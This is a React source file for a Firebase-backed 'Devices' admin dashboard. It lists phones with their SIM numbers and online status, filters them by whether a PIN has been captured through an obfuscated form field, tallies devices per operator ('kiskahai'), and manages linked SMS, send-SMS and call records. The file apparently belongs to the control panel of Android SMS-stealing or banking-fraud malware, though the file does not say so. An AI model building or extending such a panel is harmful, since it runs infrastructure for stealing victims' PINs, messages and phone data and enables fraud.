import { useState, useEffect, useMemo } from "react";
import { useFirebaseUsers, useAllDeviceForms, useAllDeviceNotes } from "@/hooks/useFirebaseData";
import { ref, set, remove, onValue } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { toast } from "sonner";
import DeviceCard from "@/components/DeviceCard";
import DeviceDetail from "@/components/DeviceDetail";
import { Search, Wifi, WifiOff, ArrowUpDown, X, Smartphone, Users, BarChart3 } from "lucide-react";
import { Skeleton } from "@/components/ui/skeleton";
import { useIsMobile } from "@/hooks/use-mobile";

type FilterMode = "all" | "online" | "offline" | "with_pin" | "without_pin";

const DevicesPage = () => {
  const { users, loading } = useFirebaseUsers();
  const { formsMap } = useAllDeviceForms();
  const { notesMap } = useAllDeviceNotes();
  const isMobile = useIsMobile();
  const [isLgScreen, setIsLgScreen] = useState(false);

  useEffect(() => {
    const mql = window.matchMedia("(min-width: 1024px)");
    const onChange = () => setIsLgScreen(mql.matches);
    mql.addEventListener("change", onChange);
    setIsLgScreen(mql.matches);
    return () => mql.removeEventListener("change", onChange);
  }, []);

  // Mobile: single device overlay
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  // Desktop: multiple open tabs
  const [openTabs, setOpenTabs] = useState<string[]>([]);
  const [activeTab, setActiveTab] = useState<string | null>(null);

  const [filter, setFilter] = useState<FilterMode>("all");
  const [search, setSearch] = useState("");
  const [pinnedDevices, setPinnedDevices] = useState<Record<string, boolean>>({});
  const [visibleCount, setVisibleCount] = useState(20);
  const [deviceSort, setDeviceSort] = useState<"newest" | "oldest">("newest");
  const [kiskaFilter, setKiskaFilter] = useState<string | null>(null);
  const [showKiskaStats, setShowKiskaStats] = useState(false);
  const PAGE_SIZE = 20;

  // How many panels fit based on screen width (each panel ~400px min)
  const getMaxPanels = () => {
    if (typeof window === "undefined") return 2;
    const available = window.innerWidth - 260; // subtract sidebar
    if (available >= 1200) return 3;
    if (available >= 800) return 2;
    return 1;
  };

  useEffect(() => {
    const pinnedRef = ref(db, "pinned_devices");
    const unsub = onValue(pinnedRef, (snap) => {
      setPinnedDevices(snap.val() || {});
    });
    return () => unsub();
  }, []);

  const handleDeviceClick = (id: string) => {
    if (!isLgScreen) {
      setSelectedDevice(id);
      return;
    }
    // Desktop tab mode
    if (openTabs.includes(id)) {
      setActiveTab(id);
      return;
    }
    const maxPanels = getMaxPanels();
    if (openTabs.length >= maxPanels) {
      // Replace the oldest non-active tab, or the first one
      const replaceIdx = openTabs.findIndex((t) => t !== activeTab);
      const idx = replaceIdx >= 0 ? replaceIdx : 0;
      setOpenTabs((tabs) => {
        const next = [...tabs];
        next[idx] = id;
        return next;
      });
    } else {
      setOpenTabs((tabs) => [...tabs, id]);
    }
    setActiveTab(id);
  };

  const closeTab = (id: string) => {
    setOpenTabs((tabs) => tabs.filter((t) => t !== id));
    if (activeTab === id) {
      setActiveTab((prev) => {
        const remaining = openTabs.filter((t) => t !== id);
        return remaining.length > 0 ? remaining[remaining.length - 1] : null;
      });
    }
  };

  const togglePin = async (id: string) => {
    const isPinned = !!pinnedDevices[id];
    await set(ref(db, `pinned_devices/${id}`), isPinned ? null : true);
  };

  const saveNotes = async (id: string, notes: string) => {
    await set(ref(db, `users/${id}/notes`), notes);
  };

  const deleteDevice = async (id: string) => {
    try {
      await Promise.all([
        remove(ref(db, `users/${id}`)),
        remove(ref(db, `mess/${id}`)),
        remove(ref(db, `sendsms/${id}`)),
        remove(ref(db, `call/${id}`)),
        remove(ref(db, `pinned_devices/${id}`)),
        remove(ref(db, `device_links/${id}`)),
      ]);
      toast.success("Device and all related data deleted");
    } catch (err) {
      console.error(err);
      toast.error("Failed to delete device data");
    }
  };

  const userEntries = Object.entries(users).filter(([, u]) => u.model && u.model.trim() !== "");
  const onlineCount = userEntries.filter(([, u]) => u.status === "online").length;

  // Kiskahai stats
  const kiskaStats = useMemo(() => {
    const map: Record<string, { total: number; online: number }> = {};
    userEntries.forEach(([, u]) => {
      const name = u.kiskahai || "Unknown";
      if (!map[name]) map[name] = { total: 0, online: 0 };
      map[name].total++;
      if (u.status === "online") map[name].online++;
    });
    return Object.entries(map).sort((a, b) => b[1].total - a[1].total);
  }, [userEntries]);

  const hasPin = (deviceId: string) => {
    const forms = formsMap[deviceId] || [];
    return forms.some((f) => f.content?.bvcx);
  };

  const filteredEntries = userEntries.filter(([id, u]) => {
    if (filter === "online" && u.status !== "online") return false;
    if (filter === "offline" && u.status === "online") return false;
    if (filter === "with_pin" && !hasPin(id)) return false;
    if (filter === "without_pin" && hasPin(id)) return false;
    if (kiskaFilter && (u.kiskahai || "Unknown") !== kiskaFilter) return false;
    if (search.trim()) {
      const q = search.toLowerCase();
      return (
        id.toLowerCase().includes(q) ||
        u.brand.toLowerCase().includes(q) ||
        u.model.toLowerCase().includes(q) ||
        u.sim1?.toLowerCase().includes(q) ||
        u.sim2?.toLowerCase().includes(q) ||
        (u.kiskahai || "").toLowerCase().includes(q)
      );
    }
    return true;
  });

  const filters: { key: FilterMode; label: string }[] = [
    { key: "all", label: `All (${userEntries.length})` },
    { key: "online", label: `Online (${onlineCount})` },
    { key: "offline", label: `Offline (${userEntries.length - onlineCount})` },
    { key: "with_pin", label: "With PIN" },
  ];

  const hasOpenTabs = isLgScreen && openTabs.length > 0;

  return (
    <div className="min-h-screen pb-20 lg:pb-0 bg-background flex flex-col lg:flex-row lg:h-screen lg:overflow-hidden">
      {/* Left: Device list */}
      <div className={`flex flex-col ${hasOpenTabs ? "lg:w-[340px] xl:w-[380px] lg:shrink-0 lg:border-r lg:border-border/50" : "flex-1"} lg:h-screen lg:overflow-hidden`}>
        <header className="sticky top-0 z-30 border-b border-border/60 bg-background/80 backdrop-blur-2xl shrink-0">
          <div className="px-5 pt-4 pb-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 rounded-2xl bg-gradient-to-br from-primary/20 to-primary/5 border border-primary/10 flex items-center justify-center">
                  <Search className="h-4.5 w-4.5 text-primary" />
                </div>
                <div>
                  <h1 className="text-lg font-extrabold text-foreground tracking-tight">Devices</h1>
                  <p className="text-[10px] text-muted-foreground font-medium mt-0.5">
                    {loading ? "Loading..." : `${userEntries.length} total devices`}
                  </p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-green/10 border border-green/20">
                  <Wifi className="h-3 w-3 text-green" />
                  <span className="text-[11px] font-bold text-green">{onlineCount}</span>
                </div>
                <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-secondary border border-border">
                  <WifiOff className="h-3 w-3 text-muted-foreground" />
                  <span className="text-[11px] font-bold text-muted-foreground">{userEntries.length - onlineCount}</span>
                </div>
              </div>
            </div>
          </div>
        </header>

        <div className="flex-1 overflow-y-auto px-5 py-4 space-y-3">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <input
              type="text"
              value={search}
              onChange={(e) => { setSearch(e.target.value); setVisibleCount(PAGE_SIZE); }}
              placeholder="Search devices..."
              className="w-full rounded-xl border border-border bg-card pl-10 pr-4 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary"
            />
          </div>

          <div className="flex flex-wrap gap-1.5">
            {filters.map((f) => (
              <button
                key={f.key}
                onClick={() => { setFilter(f.key); setVisibleCount(PAGE_SIZE); }}
                className={`px-2.5 py-1 rounded-full text-[11px] font-medium transition-colors ${
                  filter === f.key
                    ? "bg-primary text-primary-foreground"
                    : "bg-secondary text-muted-foreground hover:text-foreground"
                }`}
              >
                {f.label}
              </button>
            ))}
            <button
              onClick={() => setDeviceSort(s => s === "newest" ? "oldest" : "newest")}
              className="flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-medium bg-secondary text-muted-foreground hover:text-foreground transition-colors"
            >
              <ArrowUpDown className="h-3 w-3" />
              {deviceSort === "newest" ? "Newest" : "Oldest"}
            </button>
            <button
              onClick={() => setShowKiskaStats(true)}
              className="flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-medium bg-purple/10 text-purple hover:bg-purple/20 transition-colors"
            >
              <BarChart3 className="h-3 w-3" />
              Kiskahai
            </button>
            {kiskaFilter && (
              <button
                onClick={() => { setKiskaFilter(null); setVisibleCount(PAGE_SIZE); }}
                className="flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-bold bg-purple text-primary-foreground transition-colors"
              >
                <Users className="h-3 w-3" />
                {kiskaFilter}
                <X className="h-3 w-3 ml-0.5" />
              </button>
            )}
          </div>

          {/* Kiskahai Stats Modal */}
          {showKiskaStats && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4" onClick={() => setShowKiskaStats(false)}>
              <div className="w-full max-w-sm rounded-2xl border border-border bg-card p-5 shadow-2xl space-y-4 max-h-[70vh] overflow-y-auto" onClick={(e) => e.stopPropagation()}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <BarChart3 className="h-4 w-4 text-purple" />
                    <h3 className="text-sm font-bold text-foreground">Kiskahai Stats</h3>
                  </div>
                  <button onClick={() => setShowKiskaStats(false)} className="h-7 w-7 rounded-lg bg-secondary flex items-center justify-center hover:bg-destructive/10 hover:text-destructive transition-colors">
                    <X className="h-3.5 w-3.5" />
                  </button>
                </div>
                <div className="space-y-2">
                  {kiskaStats.map(([name, stat]) => (
                    <button
                      key={name}
                      onClick={() => { setKiskaFilter(name); setShowKiskaStats(false); setVisibleCount(PAGE_SIZE); }}
                      className={`w-full flex items-center justify-between px-3 py-2.5 rounded-xl border transition-all text-left ${
                        kiskaFilter === name
                          ? "border-purple/40 bg-purple/10"
                          : "border-border bg-secondary/50 hover:border-purple/30 hover:bg-purple/5"
                      }`}
                    >
                      <div className="flex items-center gap-2.5">
                        <div className="h-8 w-8 rounded-lg bg-purple/15 flex items-center justify-center">
                          <Users className="h-3.5 w-3.5 text-purple" />
                        </div>
                        <span className="text-xs font-semibold text-foreground">{name}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-[10px] font-bold text-green bg-green/10 px-1.5 py-0.5 rounded-md">{stat.online} on</span>
                        <span className="text-xs font-bold text-muted-foreground">{stat.total}</span>
                      </div>
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}

          <section>
            {loading ? (
              <div className={`grid gap-3 ${hasOpenTabs ? "grid-cols-1" : "grid-cols-1 md:grid-cols-2 xl:grid-cols-3"}`}>
                {Array.from({ length: 6 }).map((_, i) => (
                  <div key={i} className="rounded-2xl border border-border bg-card p-4 space-y-3">
                    <div className="flex items-center gap-2.5">
                      <Skeleton className="h-10 w-10 rounded-xl" />
                      <div className="space-y-1.5 flex-1">
                        <Skeleton className="h-4 w-32" />
                        <Skeleton className="h-3 w-16" />
                      </div>
                      <Skeleton className="h-4 w-10" />
                    </div>
                    <div className="flex gap-3">
                      <Skeleton className="h-3 w-14" />
                      <Skeleton className="h-3 w-24" />
                    </div>
                  </div>
                ))}
              </div>
            ) : filteredEntries.length === 0 ? (
              <div className="rounded-2xl border border-border bg-card p-12 text-center">
                <p className="text-muted-foreground">No devices found</p>
              </div>
            ) : (
              <>
                <div className={`grid gap-3 ${hasOpenTabs ? "grid-cols-1" : "grid-cols-1 md:grid-cols-2 xl:grid-cols-3"}`}>
                  {(() => {
                    const sorted = [...filteredEntries].sort(([aId, aUser], [bId, bUser]) => {
                      const aPinned = !!pinnedDevices[aId];
                      const bPinned = !!pinnedDevices[bId];
                      if (aPinned && !bPinned) return -1;
                      if (!aPinned && bPinned) return 1;
                      const aTime = aUser.timestamp || 0;
                      const bTime = bUser.timestamp || 0;
                      return deviceSort === "newest" ? bTime - aTime : aTime - bTime;
                    });
                    const isSearching = search.trim().length > 0;
                    const visible = isSearching ? sorted : sorted.slice(0, visibleCount);
                    return visible.map(([id, user], index) => (
                      <DeviceCard
                        key={id}
                        id={id}
                        index={filteredEntries.length - index}
                        user={user}
                        onClick={() => handleDeviceClick(id)}
                        onDelete={() => deleteDevice(id)}
                        notes={notesMap[id] || ""}
                        onNotesChange={(notes) => saveNotes(id, notes)}
                        forms={formsMap[id] || []}
                        pinned={!!pinnedDevices[id]}
                        onTogglePin={() => togglePin(id)}
                      />
                    ));
                  })()}
                </div>
                {!search.trim() && visibleCount < filteredEntries.length && (
                  <button
                    onClick={() => setVisibleCount((c) => c + PAGE_SIZE)}
                    className="w-full mt-4 py-3 rounded-xl border border-primary/20 bg-primary/10 text-sm font-bold text-primary hover:bg-primary/20 active:scale-[0.98] transition-all"
                  >
                    Load More ({Math.min(PAGE_SIZE, filteredEntries.length - visibleCount)} more)
                  </button>
                )}
              </>
            )}
          </section>
        </div>
      </div>

      {/* Desktop: Tab panels */}
      {hasOpenTabs && (
        <div className="hidden lg:flex flex-col flex-1 h-screen overflow-hidden">
          {/* Tab bar */}
          <div className="shrink-0 flex items-center border-b border-border bg-card/50 backdrop-blur-sm overflow-x-auto">
            {openTabs.map((tabId) => {
              const u = users[tabId];
              const isActive = activeTab === tabId;
              return (
                <div
                  key={tabId}
                  className={`flex items-center gap-2 px-4 py-2.5 border-r border-border cursor-pointer transition-colors min-w-0 ${
                    isActive ? "bg-background border-b-2 border-b-primary" : "bg-card/30 hover:bg-secondary/50"
                  }`}
                  onClick={() => setActiveTab(tabId)}
                >
                  <div className={`h-5 w-5 rounded-md flex items-center justify-center shrink-0 ${u?.status === "online" ? "bg-green/20" : "bg-secondary"}`}>
                    <Smartphone className={`h-3 w-3 ${u?.status === "online" ? "text-green" : "text-muted-foreground"}`} />
                  </div>
                  <span className={`text-xs font-semibold truncate max-w-[120px] ${isActive ? "text-foreground" : "text-muted-foreground"}`}>
                    {u ? `${u.brand} ${u.model}` : tabId.slice(0, 10)}
                  </span>
                  <button
                    onClick={(e) => { e.stopPropagation(); closeTab(tabId); }}
                    className="h-5 w-5 rounded-md flex items-center justify-center hover:bg-destructive/10 hover:text-destructive transition-colors shrink-0"
                  >
                    <X className="h-3 w-3" />
                  </button>
                </div>
              );
            })}
          </div>

          {/* Active panel */}
          <div className="flex-1 overflow-hidden">
            {activeTab && users[activeTab] && (
              <DeviceDetail
                key={activeTab}
                id={activeTab}
                user={users[activeTab]}
                onClose={() => closeTab(activeTab)}
                pinned={!!pinnedDevices[activeTab]}
                onTogglePin={() => togglePin(activeTab)}
                embedded
              />
            )}
          </div>
        </div>
      )}

      {/* Mobile: fullscreen overlay */}
      {!isLgScreen && selectedDevice && users[selectedDevice] && (
        <DeviceDetail
          id={selectedDevice}
          user={users[selectedDevice]}
          onClose={() => setSelectedDevice(null)}
          pinned={!!pinnedDevices[selectedDevice]}
          onTogglePin={() => togglePin(selectedDevice)}
        />
      )}
    </div>
  );
};

export default DevicesPage;
